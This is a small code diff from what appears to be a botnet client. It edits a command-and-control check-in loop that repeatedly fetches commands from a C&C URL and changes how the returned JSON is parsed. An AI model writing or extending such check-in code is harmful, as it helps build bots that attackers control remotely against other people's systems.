@@ -13,7 +13,7 @@ class cnc_checkin(Thread):
         while(True):
             curr_commands = requests.get(self.BotInstance.cnc_url)
             try:
-                curr_commands = curr_commands.json()['commands']
+                curr_commands = curr_commands.json()['commands']['commands']
             except:
                 raise
 
